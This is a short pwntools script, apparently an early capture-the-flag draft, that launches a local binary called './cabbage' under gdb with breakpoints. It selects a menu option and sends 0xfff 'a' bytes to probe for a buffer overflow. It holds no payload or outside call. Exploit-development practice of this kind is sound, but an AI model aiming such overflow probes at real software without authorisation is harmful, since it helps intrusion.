#!/usr/bin/python3

from pwn import *
context.terminal = ['tmux', 'new-window']
use_gdb = True 

if use_gdb:
    c = gdb.debug('./cabbage', '''
    break main
    break *main+109
    ''')

else:
    c = process('./cabbage')


log.info(c.recv(500))
c.sendline(b'1')
c.send(b'a' * 0xfff + b'\n')
c.interactive()
